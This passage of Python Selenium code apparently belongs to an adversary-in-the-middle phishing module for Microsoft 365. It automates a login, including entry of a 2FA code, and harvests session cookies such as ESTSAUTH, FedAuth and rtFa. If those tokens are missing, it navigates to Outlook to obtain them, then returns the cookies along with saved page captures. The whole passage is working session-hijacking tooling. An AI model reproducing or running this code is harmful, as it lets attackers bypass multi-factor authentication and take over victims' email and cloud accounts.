                except NoSuchElementException:
                    log("Verify button not found")
            else:
                log('OTP input not found – continuing without entering 2FA code')

            # Always switch back to the main document in case we were inside an iframe
            try:
                driver.switch_to.default_content()
            except Exception:
                pass

            # Handle optional stay signed in prompt
            try:
                WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.ID, 'idBtn_Back'))
                ).click()
                log("Clicked 'No' on stay signed in prompt")
            except Exception:
                pass  # prompt may not appear

            # Wait until redirected to Office portal or other Microsoft service page
            try:
                WebDriverWait(driver, 20).until(
                    EC.url_contains('office')
                )
                log("Successfully redirected to Office portal")
            except Exception:
                log(f"Timeout waiting for Office redirect. Current URL: {driver.current_url}")

            time.sleep(2)

            cookies = driver.get_cookies()
            log(f"Captured {len(cookies)} cookies")

            # ------------------------------------------------------------------
            # Post-login step: ensure workload tokens (rtFa / FedAuth / ESTSAUTH)
            # are present by navigating to Outlook if necessary.
            # ------------------------------------------------------------------

            def _has_workload_tokens(c_list):
                names = {c.get('name') for c in c_list}
                return any(n in names for n in ('rtFa', 'FedAuth', 'ESTSAUTH'))

            if not _has_workload_tokens(cookies):
                log("Workload tokens missing – navigating to Outlook to mint them")
                try:
                    driver.get(os.getenv('O365_WORKLOAD_URL', 'https://outlook.office.com/mail/'))
                    WebDriverWait(driver, 15).until(EC.url_contains('outlook'))
                    time.sleep(3)

                    extra_cookies = driver.get_cookies()
                    before_cnt = len(cookies)
                    seen = {(c['name'], c.get('domain')) for c in cookies}
                    for ck in extra_cookies:
                        if (ck['name'], ck.get('domain')) not in seen:
                            cookies.append(ck)

                    log(f"Added {len(cookies) - before_cnt} additional cookies from Outlook navigation; total {len(cookies)}")
                except Exception as token_exc:
                    log(f"Failed to retrieve workload tokens: {token_exc}")

            # Always save the final page source & screenshot for debugging purposes
            try:
                timestamp = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                final_html_path = f'/tmp/o365_final_page_{timestamp}.html'
                final_png_path = f'/tmp/o365_final_page_{timestamp}.png'
                with open(final_html_path, 'w', encoding='utf-8') as fp:
                    fp.write(driver.page_source)
                driver.save_screenshot(final_png_path)
                log(f"Saved final page artifacts: {final_html_path}, {final_png_path}")

                # Append paths to first cookie object to make them easy to locate later
                if cookies:
                    cookies[0]['page_source'] = final_html_path
                    cookies[0]['screenshot'] = final_png_path
                    cookies[0]['final_url'] = driver.current_url
                else:
                    # If no cookies, create a dict to hold the debug info
                    cookies = [{
                        'page_source': final_html_path,
                        'screenshot': final_png_path,
                        'final_url': driver.current_url,
                        'warning': 'No cookies captured'
                    }]
            except Exception as e:
                log(f"Failed to save final artifacts: {str(e)}")
                
        except Exception as e:
            tb = traceback.format_exc()
            print(f"[perform_automated_login] Exception: {tb}")
            log(f"Exception occurred: {str(e)}")
            
            # Enhanced error reporting with current state
            cookies = [{
                "error": str(e),
                "traceback": tb,
                "current_url": driver.current_url if driver else "Driver not initialized",
                "timestamp": datetime.datetime.utcnow().isoformat()
            }]
            
            try:
                if driver:
                    # First snapshot immediately after failure
                    page_source = driver.page_source
                    timestamp1 = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                    page_path = f'/tmp/o365_error_{timestamp1}.html'
                    with open(page_path, 'w', encoding='utf-8') as fp:
                        fp.write(page_source)
                    screenshot_path = f'/tmp/o365_error_{timestamp1}.png'
                    driver.save_screenshot(screenshot_path)
                    cookies[0]['page_source'] = page_path
                    cookies[0]['screenshot'] = screenshot_path
                    log(f"Saved error artifacts: {page_path}, {screenshot_path}")

                    # Wait and capture second state
                    time.sleep(6)
                    try:
                        page_source2 = driver.page_source
                        timestamp2 = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                        page_path2 = f'/tmp/o365_error2_{timestamp2}.html'
                        with open(page_path2, 'w', encoding='utf-8') as fp:
                            fp.write(page_source2)
                        screenshot_path2 = f'/tmp/o365_error2_{timestamp2}.png'
                        driver.save_screenshot(screenshot_path2)
                        cookies[0]['page_source_wait'] = page_path2
                        cookies[0]['screenshot_wait'] = screenshot_path2
                        log(f"Saved second error artifacts: {page_path2}, {screenshot_path2}")
                    except Exception:
                        pass
            except Exception as debug_error:
                log(f"Failed to capture debug artifacts: {str(debug_error)}")
                
        finally:
            try:
                if driver:
                    driver.quit()
                    log("Chrome driver closed")
            except Exception:
                pass
                
        return cookies

def load(enable_2fa=False, use_aitm_proxy=True):
    return Office365Module(enable_2fa, use_aitm_proxy)
